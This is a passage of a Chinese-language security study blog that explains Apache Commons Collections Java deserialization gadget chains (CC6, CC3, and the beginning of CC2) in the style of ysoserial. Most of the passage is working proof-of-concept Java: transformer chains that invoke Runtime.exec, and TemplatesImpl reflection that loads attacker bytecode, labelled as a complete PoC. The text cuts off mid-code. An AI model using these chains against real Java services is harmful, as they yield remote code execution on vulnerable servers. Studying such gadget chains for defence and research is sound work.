class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line">        decorate.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于在java  8u71，这个利⽤链不能再利⽤了，主要原因 是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>ysoserial作者找到了另一条能够触发lazymap的方法，就是TiedMapEntry这个类中的getValue方法中调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631173688-6b2f4fa3-9729-4e57-a6d4-ffcde6469ec7.png" alt=""></p><p>在其同类中的hashcode方法调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631197142-e2200442-a755-48e6-bbd1-283141a6b22b.png" alt=""></p><p>所以我们想要进行rce就需要找到一个可以触发hashcode的方法，在URLDNS链中我们知道hashmap的readobject中调用了hash方法，而其hash方法中又调用了hashcode方法，所以调用链就出来了，我们可以构造一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer, transformers);</span><br></pre></td></tr></table></figure><p>这里由于hasmap在put的时候也会调用hash方法所以我们先用一个假的invokertransformer进行put然后在反射修改成真的就不会在put的时候触发了，但是我们这样反序列化运行后发现也没有触发，这是什么原因，我们跟进来看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631432833-aa4fdbc8-ce47-40e3-9f90-21c1541abfdd.png" alt="">我们发现在lazymap中并没有进入if条件，这说明key被传入了，但是我们并没有给lazymao传入值，这里通过调试发现我们在hashmap进行put的时候进入lazymap的if条件之后如果没有key值他是会在进行put进去的所以我们只需要在put之后在进行删除即可poc如开头。</p><p>参考：<a href="https://blog.csdn.net/weixin_49125123/article/details/135232651">https://blog.csdn.net/weixin_49125123/article/details/135232651</a> <a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631644198-f098a5bc-21e1-44bd-ad0f-51db9c50d07f.pdf">Java安全漫谈 - 12.反序列化篇(6).pdf</a></p><h3 id="cc6调用链">cc6调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714668463375-9a53c70d-4ae7-414f-a145-96b13370c7c6.png" alt=""></p><h2 id="6-java-cc3链">6.java cc3链</h2><p>cc3用的是动态加载字节码的形式进行的rce可以参考自己记得<a href="https://www.yuque.com/zqiangweihuakai/kb/qlir1pya36gtghqn">动态加载字节码</a>的笔记来了解。</p><p>该链主要是利用了TemplatesImpl这个类进行字节码加载。通过笔记我们了解到java加载.class的核心代码就是defineclass方法，而通过调试发现TemplatesImpl这个类中定义了一个内部类重写了defineclass方法并且这里没有显式地声明其定义域。Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663398722-55450f8c-336f-4160-9cb6-fb68b2367e15.png" alt=""></p><p>但是我们需要找到一个该类一个public类型来进行调用该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663560670-d044b685-2961-437d-9c2a-a31d628255f9.png" alt="">我们反向跟踪在defineTransletClasses中调用了该方法，需要_bytecodes不为空，其实这个属性就是我们要传入的字节码但是还不能调用需要继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663667380-3fba4569-64f0-44c6-8109-40b9ad24962d.png" alt=""></p><p>找到了getTransletInstance方法并且其属性_name不能为空 _class需要为空才可以调用，但是还是不能在外部调用需要继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663736056-8819d01c-e84c-4813-b5a3-4f98c449fd25.png" alt=""></p><p>最终找到了newTransformer方法是public类型的，所以我们可以通过实例化TemplatesImpl对象调用newTransformer方法来触发defineclass加载字节码。</p><p>接下来我们需要看一下TemplatesImpl构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663912873-86f895fb-445f-4457-b20d-6b315e042693.png" alt=""></p><p>发现并没用进行任何赋值所以我们需要自己手动进行反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>运行发现空指针错误，通过调试发现</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664277730-268e14ac-7775-4c4f-b300-2ac2366302ae.png" alt=""></p><p>_tfactory为空所以我们需要给其传入值，</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664331886-af671cab-f9c8-446d-a443-5829c7d7f385.png" alt=""></p><p>通过查看发现其是transient类型是不可序列化的，所以我们通过产看readObject中看看是给其赋值的什么就给他赋值什么就可以</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664419837-1a271fc1-9a92-4754-a71d-4bea2f9f6eee.png" alt=""></p><p>所以重新构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bbyte[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>但是运行之后发现还是报错</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664557971-bc6614a1-c6ac-46ba-93da-c9270ba0cc09.png" alt=""></p><p>原因是在加载字节码之后有一个方法查看字节码的父类是否是<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664601418-b93e8e9d-23be-46c0-9744-cc79bf454422.png" alt=""></p><p>所以我们需要让我们的恶意类继承该类之后就可以运行了。</p><p>然后我们和之前的cc1链前面结合一下就可以成为一个链了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是我们通过查看ysoserial作者发现其构造的链跟我们不一样，他没有用这个InvokerTransformer去触发，原因就是因为可能有些waf会对InvokerTransformer做了黑名单限制导致不能够使用了。</p><p>所以ysoserial作者发现了com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 。 这个类的构造⽅法中调⽤了 (TransformerImpl) templates.newTransformer() ，免去了我们使⽤ InvokerTransformer⼿⼯调⽤ newTransformer() ⽅法这⼀步：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714666476954-c09853ee-7994-4d00-978e-9e7cc10e2c93.png" alt=""></p><p>但是呢由于该类是不可以被序列化的，所以我们只能通过对其反射获取class对象对其进行赋值，这里作者ysoserial找到一个InstantiateTransformer类他实现了transformer Serializable接口，在它的transform()方法中，判断了input参数是否为Class，若是Class，则通过反射实例化一个对象并返回；</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714667122114-6b707d16-67b2-4975-b70f-a170a58e559d.png" alt=""></p><p>所以这里我们可以通过调用InstantiateTransformer的transform方法来触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">       <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">       <span class="comment">// 获取 class 对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">       <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">       classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">       <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">       bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 触发方法</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span> [] &#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span> [] &#123;templates&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">       <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">       <span class="comment">/*InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span></span><br><span class="line"><span class="comment">       instantiateTransformer.transform(TrAXFilter.class);*/</span></span><br><span class="line">       HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">       Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">               map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">       <span class="comment">//serialize(o);</span></span><br><span class="line">       unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714669560414-6960b378-e64f-44d0-9074-f683ae520ea9.pdf">Java安全漫谈 - 14.为什么需要CommonsCollections3.pdf</a></p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123376523">https://blog.csdn.net/weixin_54648419/article/details/123376523</a></p><h3 id="cc3调用链">cc3调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714669437495-5c7c2b2f-a311-4a6d-b4d7-77283e919462.png" alt=""></p><h2 id="java-cc2链">java cc2链</h2><p>通过yso的代码可以看出，cc2利用链用的是commons-collections4版本，而我们之前用的是3.1版本。所以首先要下载一下依赖，pom文件加入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="调用方式1：">调用方式1：</h3><p>然后就是他前半部分的调用链变了先来看一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title 